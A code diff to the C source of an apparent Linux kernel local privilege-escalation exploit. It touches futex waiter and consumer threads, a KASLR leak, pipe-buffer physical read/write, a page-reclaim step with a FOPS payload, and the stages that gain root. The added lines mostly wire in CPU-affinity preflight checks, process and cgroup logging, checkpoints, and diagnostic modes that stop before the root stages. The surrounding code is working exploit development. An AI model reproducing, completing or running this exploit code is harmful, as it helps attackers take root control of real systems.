@@ -23,6 +23,15 @@ atomic_int pipe_prepare_done;
 atomic_int consumer_nice_val;
 int memfd_leak;
 
+#if defined(RMG_DIAG_COW_PARENT_AFFINITY_ONLY) && \
+    RMG_DIAG_COW_PARENT_AFFINITY_ONLY
+#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY || \
+    !defined(RMG_DIAG_COW_REQUIRE_CPUS_67) || \
+    !RMG_DIAG_COW_REQUIRE_CPUS_67
+#error "parent-affinity-only diagnostics require COW-only CPU 6/7 guard mode"
+#endif
+#endif
+
 /* Shared memory for cross-process waiter32 communication.
  * Layout mirrors waiter32.c's SHM_* offsets. */
 #define W32_SHM_STATE         0x000
@@ -85,6 +94,11 @@ static void noop_signal_handler(int sig) { (void)sig; }
 
 static void ghost_usr1_handler(int sig) {
   (void)sig;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("readiness-signal-handler-entry",
+                      (unsigned long long)syscall(SYS_gettid),
+                      (unsigned long long)atomic_load(&waiter_tid));
+#endif
   if (atomic_load(&waiter_futex_returned))
     return;
   if (!atomic_load(&ghost_bug_armed))
@@ -149,6 +163,63 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   return NULL;
 }
 
+#if defined(RMG_DIAG_COW_CONSUMER_AFFINITY) && \
+    RMG_DIAG_COW_CONSUMER_AFFINITY
+#if !defined(RMG_DIAG_COW_TRACE) || !RMG_DIAG_COW_TRACE || \
+    !defined(RMG_DIAG_PASSIVE_COW_OBSERVER) || \
+    !RMG_DIAG_PASSIVE_COW_OBSERVER || \
+    ((!defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY) && \
+     (!defined(RMG_DIAG_PI_PROBE_ONLY) || !RMG_DIAG_PI_PROBE_ONLY || \
+      !defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) || \
+      !RMG_DIAG_UCLAMP_TRIGGER_ONLY))
+#error "consumer affinity diagnostic requires COW-only or guarded PI mode with passive COW tracing"
+#endif
+static unsigned long long rmg_diag_consumer_affinity_mask64(
+    const cpu_set_t *mask) {
+  unsigned long long bits = 0;
+  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
+    if (CPU_ISSET(cpu, mask))
+      bits |= 1ULL << cpu;
+  }
+  return bits;
+}
+
+static void rmg_diag_log_consumer_affinity(const char *phase,
+                                           int requested, int avoid) {
+  cpu_set_t mask;
+  CPU_ZERO(&mask);
+  errno = 0;
+  int ret = sched_getaffinity(0, sizeof(mask), &mask);
+  int saved_errno = ret == 0 ? 0 : errno;
+  pr_info("COW_CONSUMER_AFFINITY phase=%s tid=%ld requested=%d avoid=%d "
+          "sched_cpu=%d getaffinity=%d errno=%d mask=%016llx\n",
+          phase, (long)syscall(SYS_gettid), requested, avoid, sched_getcpu(),
+          ret, saved_errno,
+          ret == 0 ? rmg_diag_consumer_affinity_mask64(&mask) : 0);
+}
+
+static int rmg_diag_pin_consumer_with_allowed_affinity(size_t requested,
+                                                        int avoid) {
+  int requested_core = (int)requested;
+  rmg_diag_log_consumer_affinity("before-widen", requested_core, avoid);
+
+  cpu_set_t all_cpus;
+  memset(&all_cpus, 0xff, sizeof(all_cpus));
+  errno = 0;
+  int widen_ret = sched_setaffinity(0, sizeof(all_cpus), &all_cpus);
+  int widen_errno = widen_ret == 0 ? 0 : errno;
+  pr_info("COW_CONSUMER_AFFINITY_WIDEN tid=%ld result=%d errno=%d\n",
+          (long)syscall(SYS_gettid), widen_ret, widen_errno);
+  rmg_diag_log_consumer_affinity("after-widen", requested_core, avoid);
+
+  int pinned = pin_to_core_ex(requested, avoid);
+  rmg_diag_log_consumer_affinity("after-pin", requested_core, avoid);
+  pr_info("COW_CONSUMER_PIN requested=%d avoid=%d selected=%d\n",
+          requested_core, avoid, pinned);
+  return pinned;
+}
+#endif
+
 /* owner_thread for the waiter32 path: uses shared-memory futex words. */
 void *owner_thread_w32(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
@@ -196,7 +267,20 @@ void *owner_thread(void *arg __attribute__((unused))) {
 
 void *consumer_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
+#if defined(RMG_DIAG_COW_CONSUMER_AFFINITY) && \
+    RMG_DIAG_COW_CONSUMER_AFFINITY
+  /* waiter_thread is created immediately before this thread. Wait until it
+   * publishes its actual pinned CPU so the fallback cannot collide with it. */
+  while (!atomic_load_explicit(&waiter_ready, memory_order_acquire)) {
+    usleep(1000);
+  }
+  int waiter_core = atomic_load_explicit(&route_waiter_core,
+                                         memory_order_acquire);
+  rmg_diag_pin_consumer_with_allowed_affinity(
+      CONSUMER_CORE, waiter_core);
+#else
   pin_to_core_ex(CONSUMER_CORE, atomic_load(&route_waiter_core));
+#endif
 
   {
     int self = (int)syscall(SYS_gettid);
@@ -648,7 +732,13 @@ void run_main_route_threads(void) {
 
   while (!atomic_load(&route_done)) {
     if (atomic_exchange(&pipe_prepare_request, 0)) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("pipe-prepare-request", getpid(), 0);
+#endif
       pipebuf_page_base = prepare_pipe_buffer_page();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("pipe-prepare-return", pipebuf_page_base, 0);
+#endif
       atomic_store(&pipe_prepare_done, 1);
     }
     usleep(10000);
@@ -694,9 +784,234 @@ static pid_t spawn_allocation_keeper(void) {
   }
 }
 
+#if defined(RMG_DIAG_COW_REQUIRE_CPUS_67) && \
+    RMG_DIAG_COW_REQUIRE_CPUS_67
+#if !defined(RMG_DIAG_COW_ONLY) || !RMG_DIAG_COW_ONLY
+#error "CPU 6/7 preflight is restricted to COW-only diagnostics"
+#endif
+static unsigned long long rmg_diag_affinity_mask64(const cpu_set_t *mask) {
+  unsigned long long bits = 0;
+  for (int cpu = 0; cpu < 64 && cpu < CPU_SETSIZE; cpu++) {
+    if (CPU_ISSET(cpu, mask))
+      bits |= 1ULL << cpu;
+  }
+  return bits;
+}
+
+static void rmg_diag_log_proc_status(const char *label, const char *path,
+                                     int full_status) {
+  static const char *const fields[] = {
+      "Name:", "State:", "Tgid:", "Pid:", "PPid:", "Uid:", "Gid:",
+      "Cpus_allowed:", "Cpus_allowed_list:", "Mems_allowed_list:",
+      "CapEff:", "NoNewPrivs:", "Seccomp:", "Seccomp_filters:",
+      "NSpid:", NULL};
+  FILE *fp = fopen(path, "r");
+  if (fp == NULL) {
+    pr_warning("RMG_COW_CPU_STATUS label=%s path=%s open_errno=%d\n", label,
+               path, errno);
+    return;
+  }
+
+  char line[512];
+  errno = 0;
+  pr_info("RMG_COW_CPU_STATUS_BEGIN label=%s path=%s\n", label, path);
+  while (fgets(line, sizeof(line), fp) != NULL) {
+    int include = full_status;
+    for (size_t i = 0; !include && fields[i] != NULL; i++) {
+      if (strncmp(line, fields[i], strlen(fields[i])) == 0)
+        include = 1;
+    }
+    if (include) {
+      line[strcspn(line, "\r\n")] = '\0';
+      pr_info("RMG_COW_CPU_STATUS label=%s %s\n", label, line);
+    }
+  }
+  int read_errno = errno;
+  if (ferror(fp))
+    pr_warning("RMG_COW_CPU_STATUS label=%s path=%s read_errno=%d\n", label,
+               path, read_errno);
+  fclose(fp);
+  pr_info("RMG_COW_CPU_STATUS_END label=%s path=%s\n", label, path);
+}
+
+static void rmg_diag_log_proc_cgroup(const char *label, const char *path) {
+  FILE *fp = fopen(path, "r");
+  if (fp == NULL) {
+    pr_warning("RMG_COW_CPU_CGROUP label=%s path=%s open_errno=%d\n", label,
+               path, errno);
+    return;
+  }
+
+  char line[512];
+  errno = 0;
+  pr_info("RMG_COW_CPU_CGROUP_BEGIN label=%s path=%s\n", label, path);
+  while (fgets(line, sizeof(line), fp) != NULL) {
+    line[strcspn(line, "\r\n")] = '\0';
+    pr_info("RMG_COW_CPU_CGROUP label=%s %s\n", label, line);
+  }
+  int read_errno = errno;
+  if (ferror(fp))
+    pr_warning("RMG_COW_CPU_CGROUP label=%s path=%s read_errno=%d\n", label,
+               path, read_errno);
+  fclose(fp);
+  pr_info("RMG_COW_CPU_CGROUP_END label=%s path=%s\n", label, path);
+}
+
+static void rmg_diag_log_sched_affinity(const char *label, pid_t pid) {
+  cpu_set_t mask;
+  CPU_ZERO(&mask);
+  errno = 0;
+  int ret = sched_getaffinity(pid, sizeof(mask), &mask);
+  int saved_errno = ret == 0 ? 0 : errno;
+  unsigned long long bits = ret == 0 ? rmg_diag_affinity_mask64(&mask) : 0;
+  pr_info("RMG_COW_CPU_SCHED_AFFINITY label=%s pid=%ld result=%d "
+          "errno=%d mask=%016llx\n",
+          label, (long)pid, ret, saved_errno, bits);
+}
+
+static void rmg_diag_log_process_context(void) {
+  pid_t pid = getpid();
+  pid_t ppid = getppid();
+  pr_info("RMG_COW_CPU_CONTEXT pid=%ld ppid=%ld tid=%lld uid=%u euid=%u "
+          "gid=%u egid=%u\n",
+          (long)pid, (long)ppid, (long long)syscall(SYS_gettid), getuid(),
+          geteuid(), getgid(), getegid());
+
+  rmg_diag_log_proc_status("self", "/proc/self/status", 1);
+  rmg_diag_log_proc_cgroup("self", "/proc/self/cgroup");
+
+  if (ppid > 0) {
+    char parent_status[64];
+    char parent_cgroup[64];
+    int status_len = snprintf(parent_status, sizeof(parent_status),
+                              "/proc/%ld/status", (long)ppid);
+    int cgroup_len = snprintf(parent_cgroup, sizeof(parent_cgroup),
+                              "/proc/%ld/cgroup", (long)ppid);
+    if (status_len > 0 && (size_t)status_len < sizeof(parent_status))
+      rmg_diag_log_proc_status("parent", parent_status, 0);
+    if (cgroup_len > 0 && (size_t)cgroup_len < sizeof(parent_cgroup))
+      rmg_diag_log_proc_cgroup("parent", parent_cgroup);
+    rmg_diag_log_sched_affinity("parent", ppid);
+  }
+}
+
+static int rmg_diag_cpu67_preflight(void) {
+  rmg_diag_log_process_context();
+
+  cpu_set_t inherited, all_cpus, allowed, restored;
+  CPU_ZERO(&inherited);
+  memset(&all_cpus, 0xff, sizeof(all_cpus));
+  CPU_ZERO(&allowed);
+  CPU_ZERO(&restored);
+
+  errno = 0;
+  int inherited_ret = sched_getaffinity(0, sizeof(inherited), &inherited);
+  int inherited_errno = inherited_ret == 0 ? 0 : errno;
+  if (inherited_ret != 0) {
+    pr_warning("COW CPU preflight cannot read inherited affinity errno=%d\n",
+               inherited_errno);
+    return 0;
+  }
+
+  errno = 0;
+  int expand_ret = sched_setaffinity(0, sizeof(all_cpus), &all_cpus);
+  int expand_errno = expand_ret == 0 ? 0 : errno;
+  if (expand_ret != 0) {
+    pr_warning("COW CPU preflight cannot query allowed affinity errno=%d\n",
+               expand_errno);
+    return 0;
+  }
+
+  errno = 0;
+  int allowed_ret = sched_getaffinity(0, sizeof(allowed), &allowed);
+  int allowed_errno = allowed_ret == 0 ? 0 : errno;
+  unsigned long long inherited_bits =
+      rmg_diag_affinity_mask64(&inherited);
+  unsigned long long allowed_bits = allowed_ret == 0
+      ? rmg_diag_affinity_mask64(&allowed) : 0;
+  int cpu6_allowed = allowed_ret == 0 && CPU_ISSET(6, &allowed);
+  int cpu7_allowed = allowed_ret == 0 && CPU_ISSET(7, &allowed);
+  int observer_cpu_available = 0;
+  if (allowed_ret == 0) {
+    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
+      if (cpu != 6 && cpu != 7 && CPU_ISSET(cpu, &allowed)) {
+        observer_cpu_available = 1;
+        break;
+      }
+    }
+  }
+
+  errno = 0;
+  int restore_ret =
+      sched_setaffinity(0, sizeof(inherited), &inherited);
+  int restore_errno = restore_ret == 0 ? 0 : errno;
+  errno = 0;
+  int restored_ret = sched_getaffinity(0, sizeof(restored), &restored);
+  int restored_errno = restored_ret == 0 ? 0 : errno;
+  int restored_matches = restore_ret == 0 && restored_ret == 0;
+  if (restored_matches) {
+    for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
+      if (CPU_ISSET(cpu, &inherited) != CPU_ISSET(cpu, &restored)) {
+        restored_matches = 0;
+        break;
+      }
+    }
+  }
+
+  pr_info("RMG_COW_CPU_PREFLIGHT inherited=%016llx allowed=%016llx "
+          "allowed_errno=%d cpu6=%d cpu7=%d observer_cpu=%d "
+          "restore=%d/%d verify=%d/%d restored=%016llx match=%d\n",
+          inherited_bits, allowed_bits, allowed_errno, cpu6_allowed,
+          cpu7_allowed, observer_cpu_available, restore_ret, restore_errno,
+          restored_ret, restored_errno,
+          restored_ret == 0 ? rmg_diag_affinity_mask64(&restored) : 0,
+          restored_matches);
+
+  if (!restored_matches) {
+    pr_warning("COW CPU preflight could not restore the original affinity; "
+               "refusing the exploit route\n");
+    return 0;
+  }
+  if (allowed_ret != 0 || !cpu6_allowed || !cpu7_allowed ||
+      !observer_cpu_available) {
+    pr_warning("COW CPU preflight requires allowed CPUs 6 and 7 plus a "
+               "separate observer CPU; skipping before the exploit route\n");
+    return 0;
+  }
+  return 1;
+}
+#endif
+
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
+
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("exploit-entry", getpid(), getuid());
+#endif
+
+#if defined(RMG_DIAG_COW_REQUIRE_CPUS_67) && \
+    RMG_DIAG_COW_REQUIRE_CPUS_67
+  if (!rmg_diag_cpu67_preflight()) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("cow-cpu67-preflight-skip", 6, 7);
+#endif
+    return 42;
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cow-cpu67-preflight-pass", 6, 7);
+#endif
+#endif
+
+#if defined(RMG_DIAG_COW_PARENT_AFFINITY_ONLY) && \
+    RMG_DIAG_COW_PARENT_AFFINITY_ONLY
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("cow-parent-affinity-only-stop", getpid(), getppid());
+#endif
+  pr_warning("parent-affinity-only diagnostic stopped before the exploit "
+             "route\n");
+  return 42;
+#endif
 
   disable_rseq_for_thread();
   set_limit();
@@ -705,14 +1020,62 @@ int run_exploit(int argc, char **argv) {
 
   pin_to_core(CORE);
   if (!slide_leak_kernel_base()) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("kaslr-failed", 0, 0);
+#endif
     pr_error("slide kaslr leak failed\n");
     return 1;
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("kaslr-ready", kaslr_base, slide_p0_offset);
+#endif
   if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
     pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
                kaslr_base, kaslr_slide, slide_p0_offset);
     return 0;
   }
+
+#if defined(RMG_DIAG_PIPE_HANDOFF) && RMG_DIAG_PIPE_HANDOFF
+  reset_pipe_attempt();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-handoff-start", 0, 0);
+#endif
+  uintptr_t diagnostic_pipe_base = prepare_pipe_buffer_page();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-handoff-done", diagnostic_pipe_base, 0);
+#endif
+  pr_warning("pipe-handoff-only result base=%016zx; FOPS and root stages intentionally skipped\n",
+             diagnostic_pipe_base);
+  reset_pipe_attempt();
+  return 42;
+#elif defined(RMG_DIAG_CONTROLLED_MM) && RMG_DIAG_CONTROLLED_MM
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-start", 0, 0);
+#endif
+  int mm_collected = run_mm_collection_diagnostic();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-done", mm_collected, 0);
+#endif
+  pr_warning("mmcollect-only finished result=%d; FOPS and root stages intentionally skipped\n",
+             mm_collected);
+  return 42;
+#elif defined(RMG_DIAG_CONTROLLED_RECLAIM_ONLY) && \
+    RMG_DIAG_CONTROLLED_RECLAIM_ONLY
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-only-start", 0, 0);
+#endif
+  SYSCHK(setenv("CONTROLLED_RECLAIM", "1", 1));
+  SYSCHK(setenv("CONTROLLED_RECLAIM_PROBE", "1", 1));
+  uintptr_t diagnostic_page = prepare_kernel_page(PAGE_PAYLOAD_FOPS);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("reclaim-only-done", diagnostic_page, 0);
+#endif
+  close_reclaim_sockets();
+  cleanup_page_prepare_state();
+  pr_warning("controlled-reclaim-only result=%016zx; FOPS and root stages intentionally skipped\n",
+             diagnostic_page);
+  return 42;
+#endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   reset_pipe_attempt();
@@ -746,12 +1109,28 @@ int run_exploit(int argc, char **argv) {
     }
   }
 #else
+#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
+    RMG_DIAG_FDSET_PREFLIGHT_ONLY
+  /* This diagnostic must always use the readiness-pause route and must stop
+   * before any alternate waiter32 or post-route exploit path. */
+  run_main_route_threads();
+#else
   /* Use the 32-bit compat socketcall overlay if WAITER32=1 is set,
    * otherwise fall back to the legacy pselect/spray route. */
   if (getenv("WAITER32"))
     run_waiter32_route();
   else
     run_main_route_threads();
+#endif
+#endif
+
+#if defined(RMG_DIAG_FDSET_PREFLIGHT_ONLY) && \
+    RMG_DIAG_FDSET_PREFLIGHT_ONLY
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("fdset-preflight-run-stop", cfi_last_step,
+                      cfi_last_errno);
+#endif
+  return 42;
 #endif
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
